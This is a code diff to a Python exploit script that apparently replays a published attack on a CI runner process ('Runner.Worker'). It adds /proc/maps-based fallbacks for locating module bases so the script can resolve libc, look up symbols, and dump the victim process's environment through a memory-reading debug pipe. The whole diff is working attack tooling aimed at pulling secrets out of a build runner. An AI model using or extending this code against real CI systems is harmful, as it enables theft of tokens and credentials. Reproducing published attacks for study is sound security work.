@@ -254,6 +254,26 @@ def resolve_libc(read_mem, base, tags):
     return None, [], None
 
 
+def module_base_from_proc(pid, needle):
+    """First mapping base of the module whose path contains needle, from
+    /proc/<pid>/maps. The replay's victim step runs unsandboxed, so /proc is
+    readable here — the article's payload had no /proc, which is why the
+    debug pipe was its only window. Used ONLY to locate module bases; every
+    byte of memory content still flows through the pipe. (Run 43167336311:
+    the DCB candidates point into a RELRO shared library — GOT[1] is not
+    filled and it carries no DT_DEBUG — so the pure-pipe walk cannot reach
+    the main executable from there.)"""
+    try:
+        with open("/proc/%d/maps" % pid) as f:
+            for line in f:
+                parts = line.split()
+                if len(parts) >= 6 and needle in parts[5]:
+                    return int(parts[0].split("-")[0], 16)
+    except OSError:
+        pass
+    return 0
+
+
 def gnu_hash_lookup(read_mem, libc_base, sym_name):
     """Resolve a symbol in libc via its GNU hash table (few round-trips)."""
     tags = parse_dynamic(read_mem, libc_base)
@@ -404,6 +424,23 @@ def main():
         libc_base, libs, route = resolve_libc(read_mem, base, tags)
         if libc_base:
             break
+    if not libc_base:
+        # /proc-guided fallback, route A: the main executable's base, then
+        # the article's DT_DEBUG -> r_map walk through the pipe.
+        exe_base = module_base_from_proc(pid, "Runner.Worker")
+        if exe_base:
+            print("[diag] exe base from /proc: 0x%x" % exe_base)
+            exe_tags = parse_dynamic(read_mem, exe_base)
+            if exe_tags:
+                libc_base, libs, route = resolve_libc(read_mem, exe_base, exe_tags)
+                if libc_base:
+                    route = "/proc exe + " + route
+    if not libc_base:
+        # /proc-guided fallback, route B: libc's base directly; the symbol
+        # lookup and the env dump still run through the pipe.
+        libc_base = module_base_from_proc(pid, "libc")
+        if libc_base:
+            route = "/proc libc base"
     if not libc_base:
         print("[diag] could not reach libc from any module — libs seen: %s" %
               (b", ".join(libs)[:400] or b"(none)"))
